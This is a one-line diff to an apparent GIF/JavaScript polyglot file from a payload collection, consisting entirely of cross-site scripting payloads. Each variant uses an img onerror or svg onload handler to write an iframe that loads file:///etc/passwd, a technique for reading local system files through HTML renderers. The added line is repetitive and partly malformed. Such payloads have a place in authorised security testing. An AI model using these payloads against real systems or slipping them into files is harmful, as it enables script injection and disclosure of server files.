@@ -1,1 +1,1 @@
-GIF89a/*<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>*/=<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>//;
+GIF89a/*<svg/onload="document.write('<iframe src=file:///etc/passwd></iframe>')"/>*/=<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')">*/="document.write('<iframe src=file:///etc/passwd></iframe>')"/>*/=<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"//;
